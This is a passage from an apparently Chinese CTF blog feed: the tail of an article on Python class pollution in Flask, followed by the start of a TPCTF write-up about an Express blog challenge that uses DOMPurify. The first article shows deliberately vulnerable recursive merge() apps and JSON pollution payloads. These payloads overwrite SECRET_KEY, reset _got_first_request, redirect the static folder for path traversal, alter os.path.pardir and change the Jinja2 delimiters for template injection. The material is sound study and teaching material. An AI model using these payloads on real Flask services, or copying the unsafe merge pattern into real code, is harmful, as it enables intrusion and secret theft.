function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[+]Config:%s&quot;</span>%(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>污染链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span> : &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span> : &#123;<br>            <span class="hljs-string">&quot;app&quot;</span> : &#123;<br>                <span class="hljs-string">&quot;config&quot;</span> : &#123;<br>                    <span class="hljs-string">&quot;SECRET_KEY&quot;</span> :<span class="hljs-string">&quot;hacker&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="got-first-request污染"><a href="#got-first-request污染" class="headerlink" title="_got_first_request污染"></a>_got_first_request污染</h4><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br>flag = <span class="hljs-string">&quot;Is flag here?&quot;</span><br><br><span class="hljs-meta">@app.before_first_request</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(app, <span class="hljs-string">&quot;special&quot;</span>) <span class="hljs-keyword">and</span> app.special == <span class="hljs-string">&quot;U_Polluted_It&quot;</span>:<br>        flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-built_in">setattr</span>(app, <span class="hljs-string">&quot;special&quot;</span>, <span class="hljs-string">&quot;U_Polluted_It&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_got_first_request&quot;</span>:<span class="hljs-literal">False</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="static-url-path污染"><a href="#static-url-path污染" class="headerlink" title="_static_url_path污染"></a>_static_url_path污染</h4><p>这个属性用于定义静态文件的目录，默认情况下，Flask 会从 <code>static</code> 文件夹中提供静态文件。所以我们只要污染这个属性就可以进行目录穿越</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag in ./flag but heres only static/index.html&quot;</span><br>payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;_static_folder&quot;</span>:<span class="hljs-string">&quot;./&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a>os.path.pardir</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># Recursive merge function</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cls</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>instance = cls()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.data:<br>        merge(json.loads(request.data), instance)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flag in ./flag but heres only static/index.html&quot;</span><br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>这里是利用特性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;os&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;path&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;pardir&quot;</span>:<span class="hljs-string">&quot;,&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="SSTI-jinja2污染"><a href="#SSTI-jinja2污染" class="headerlink" title="SSTI jinja2污染"></a>SSTI jinja2污染</h4><p>这里就只贴出恶意链，不具体分析了，其实就是走的ssti的底层，去改掉模板的标识符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;app&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;jinja_env&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;variable_start_string&quot;</span>:<span class="hljs-string">&quot;[[&quot;</span>,<br>                    <span class="hljs-string">&quot;variable_end_string&quot;</span>:<span class="hljs-string">&quot;]]&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="属性污染以及寻找-pydash"><a href="#属性污染以及寻找-pydash" class="headerlink" title="属性污染以及寻找(pydash)"></a>属性污染以及寻找(pydash)</h2><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>感谢p神，baozengwi师傅</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原型链污染</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TPCTF复现</title>
    <link href="/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/09/TPCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web小白斗胆挑战国内ctf天花板，拼尽全力无法战胜 😭😭😭</p><p>但还是分享下思路吧</p><p>tips:可以使用<a href="https://yeswehack.github.io/Dom-Explorer/">Dom-Explorer</a>查看 DOMPurify 输出</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="bady-logout"><a href="#bady-logout" class="headerlink" title="bady_logout"></a>bady_logout</h2><p>xss怎么还要绕<code>dompurify</code>版本是不是太高了😁，思路错了，他采用拼接的方法，我们可以拼接xss</p><p>源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><span class="hljs-keyword">import</span> session <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-session&#x27;</span>;<br><span class="hljs-keyword">import</span> rateLimit <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express-rate-limit&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; randomBytes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;crypto&#x27;</span>;<br><span class="hljs-keyword">import</span> createDOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;dompurify&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">JSDOM</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;jsdom&#x27;</span>;<br><br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable language_">window</span> &#125; = <span class="hljs-keyword">new</span> <span class="hljs-title function_">JSDOM</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DOMPurify</span> = <span class="hljs-title function_">createDOMPurify</span>(<span class="hljs-variable language_">window</span>);<br><br><span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_LAYOUT</span> = <span class="hljs-string">`</span><br><span class="hljs-string">&lt;article&gt;</span><br><span class="hljs-string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span><br><span class="hljs-string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">&lt;/article&gt;</span><br><span class="hljs-string">`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LENGTH_LIMIT</span> = <span class="hljs-number">500</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span>) &#123;<br>  app.<span class="hljs-title function_">use</span>(<br>    <span class="hljs-string">&#x27;/api&#x27;</span>,<br>    <span class="hljs-title function_">rateLimit</span>(&#123;<br>      <span class="hljs-attr">windowMs</span>: <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,<br>      <span class="hljs-attr">max</span>: <span class="hljs-number">10</span>,<br>    &#125;),<br>  );<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>  <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">32</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,<br>&#125;));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, _, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>    req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  &#125;<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Cache-Control&#x27;</span>, <span class="hljs-string">&#x27;no-store&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>, &#123;<br>    <span class="hljs-attr">posts</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>,<br>    <span class="hljs-attr">maxLayout</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>,<br>  &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> content !== <span class="hljs-string">&#x27;string&#x27;</span> || <span class="hljs-keyword">typeof</span> layoutId !== <span class="hljs-string">&#x27;number&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid params&#x27;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (content.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Content too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> layout = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>[layoutId];<br>  <span class="hljs-keyword">if</span> (layout === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout not found&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedContent = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(content);<br>  <span class="hljs-keyword">const</span> body = layout.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\&#123;\&#123;content&#125;&#125;/g</span>, <span class="hljs-function">() =&gt;</span> sanitizedContent);<br><br>  <span class="hljs-keyword">if</span> (body.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post too long&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>  posts.<span class="hljs-title function_">set</span>(id, body);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(id);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Post <span class="hljs-subst">$&#123;id&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(layout).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span> <span class="hljs-subst">$&#123;Buffer.<span class="hljs-keyword">from</span>(sanitizedContent).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);<br><br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/layout&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; layout &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> layout !== <span class="hljs-string">&#x27;string&#x27;</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Invalid param&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (layout.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">LENGTH_LIMIT</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Layout too large&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> sanitizedLayout = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(layout);<br><br>  <span class="hljs-keyword">const</span> id = req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-property">length</span>;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span>.<span class="hljs-title function_">push</span>(sanitizedLayout);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; id &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/post/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">params</span>;<br>  <span class="hljs-keyword">const</span> body = posts.<span class="hljs-title function_">get</span>(id);<br>  <span class="hljs-keyword">if</span> (body === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Post not found&#x27;</span>);<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;post&#x27;</span>, &#123; id, body &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/clear&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">layouts</span> = [<span class="hljs-variable constant_">DEFAULT_LAYOUT</span>];<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">posts</span> = [];<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;cleared&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Web server running on port 3000&#x27;</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>我们主要看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/post&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; content, layoutId &#125; = req.<span class="hljs-property">body</span>;<br>  <span 